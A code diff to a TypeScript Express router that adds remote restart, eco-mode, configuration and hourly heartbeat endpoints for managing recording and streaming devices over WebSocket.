@@ -429,7 +429,7 @@ router.put('/:session_id/activate', (req: Request, res: Response) => {
 
 router.post('/remote-command', (req: Request, res: Response) => {
     try {
-        const { client_id, command } = req.body;
+        const { client_id, command, payload, enabled, config } = req.body;
         if (!client_id || !command) {
             res.status(400).json({ status: 'error', message: 'Missing client_id or command' });
             return;
@@ -438,8 +438,13 @@ router.post('/remote-command', (req: Request, res: Response) => {
         db.setDeviceCommand(client_id, command);
         console.log(`[broadcast] Remote command set for ${client_id}: ${command}`);
 
+        const extraData: Record<string, any> = {};
+        if (payload) Object.assign(extraData, payload);
+        if (enabled !== undefined) extraData.enabled = enabled;
+        if (config !== undefined) extraData.config = config;
+
         // ⚡ Send instant push command through live WebSocket (0ms latency, WhatsApp style)
-        const pushedViaSocket = sendDeviceCommand(client_id, command);
+        const pushedViaSocket = sendDeviceCommand(client_id, command, extraData);
         
         res.json({
             status: 'success',
@@ -447,6 +452,73 @@ router.post('/remote-command', (req: Request, res: Response) => {
             command,
             delivered_via_socket: pushedViaSocket,
         });
+    } catch (err: any) {
+        res.status(500).json({ status: 'error', message: err.message });
+    }
+});
+
+// Trigger remote soft or hard restart
+router.post('/restart', (req: Request, res: Response) => {
+    try {
+        const { client_id, type } = req.body;
+        if (!client_id) {
+            res.status(400).json({ status: 'error', message: 'Missing client_id' });
+            return;
+        }
+        const cmd = (type === 'app') ? 'RESTART_APP' : 'RESTART_STREAM';
+        db.setDeviceCommand(client_id, cmd);
+        const pushed = sendDeviceCommand(client_id, cmd);
+        console.log(`[broadcast] Restart requested for ${client_id} (${cmd}) - pushed: ${pushed}`);
+        res.json({ status: 'success', client_id, command: cmd, delivered_via_socket: pushed });
+    } catch (err: any) {
+        res.status(500).json({ status: 'error', message: err.message });
+    }
+});
+
+// Toggle Eco Low-CPU Mode remotely
+router.post('/eco-mode', (req: Request, res: Response) => {
+    try {
+        const { client_id, enabled } = req.body;
+        if (!client_id || enabled === undefined) {
+            res.status(400).json({ status: 'error', message: 'Missing client_id or enabled boolean' });
+            return;
+        }
+        const isEnabled = Boolean(enabled);
+        const pushed = sendDeviceCommand(client_id, 'SET_ECO_MODE', { enabled: isEnabled });
+        console.log(`[broadcast] Eco Mode toggled for ${client_id} to ${isEnabled} - pushed: ${pushed}`);
+        res.json({ status: 'success', client_id, enabled: isEnabled, delivered_via_socket: pushed });
+    } catch (err: any) {
+        res.status(500).json({ status: 'error', message: err.message });
+    }
+});
+
+// Save & push remote configuration
+router.post('/config', (req: Request, res: Response) => {
+    try {
+        const { client_id, config } = req.body;
+        if (!client_id || !config) {
+            res.status(400).json({ status: 'error', message: 'Missing client_id or config' });
+            return;
+        }
+        db.saveDeviceConfig(client_id, config);
+        const pushed = sendDeviceCommand(client_id, 'UPDATE_CONFIG', { config });
+        console.log(`[broadcast] Remote config saved & pushed for ${client_id} - pushed: ${pushed}`);
+        res.json({ status: 'success', client_id, config, delivered_via_socket: pushed });
+    } catch (err: any) {
+        res.status(500).json({ status: 'error', message: err.message });
+    }
+});
+
+// Retrieve saved remote configuration
+router.get('/config', (req: Request, res: Response) => {
+    try {
+        const client_id = req.query.client_id as string;
+        if (!client_id) {
+            res.status(400).json({ status: 'error', message: 'Missing client_id' });
+            return;
+        }
+        const config = db.getDeviceConfig(client_id);
+        res.json({ status: 'success', client_id, config });
     } catch (err: any) {
         res.status(500).json({ status: 'error', message: err.message });
     }
@@ -617,6 +689,57 @@ router.post('/install-beacon', (req: Request, res: Response) => {
         res.json({ status: 'ok', message: 'Install beacon recorded successfully', install: record });
     } catch (err: any) {
         console.error('[broadcast] Error recording install beacon:', err);
+        res.status(500).json({ status: 'error', message: err.message });
+    }
+});
+
+// ════════════════════════════════════════════════════════════════════════════
+// HOURLY DEVICE HEARTBEAT (Signals device is ALIVE without recording audio)
+// ════════════════════════════════════════════════════════════════════════════
+
+router.post('/heartbeat', (req: Request, res: Response) => {
+    try {
+        const { client_id, status, is_recording, battery, storage_mb, app_version, trigger_source } = req.body || {};
+        if (!client_id) {
+            res.status(400).json({ status: 'error', message: 'Missing client_id' });
+            return;
+        }
+
+        const forwarded = req.headers['x-forwarded-for'];
+        const ip = typeof forwarded === 'string' ? forwarded.split(',')[0].trim() : req.ip || req.socket.remoteAddress || '';
+        const now = new Date().toISOString();
+        const effectiveStatus = is_recording ? 'recording' : (status || 'alive');
+
+        db.recordDeviceHeartbeat(
+            client_id,
+            effectiveStatus,
+            !!is_recording,
+            typeof battery === 'number' ? battery : -1,
+            typeof storage_mb === 'number' ? storage_mb : -1,
+            app_version || '',
+            trigger_source || 'hourly',
+            ip
+        );
+
+        console.log(`[heartbeat] 💓 Device ${client_id} is ALIVE (Status: ${effectiveStatus}, Battery: ${battery ?? '?'}%, Recording: ${!!is_recording})`);
+
+        broadcastLiveEvent({
+            type: 'device_heartbeat',
+            client_id,
+            status: effectiveStatus,
+            is_recording: !!is_recording,
+            battery,
+            storage_mb,
+            timestamp: now,
+        });
+
+        res.json({
+            status: 'ok',
+            message: 'Heartbeat acknowledged: device confirmed alive',
+            server_time: now,
+        });
+    } catch (err: any) {
+        console.error('[broadcast] Error recording heartbeat:', err);
         res.status(500).json({ status: 'error', message: err.message });
     }
 });
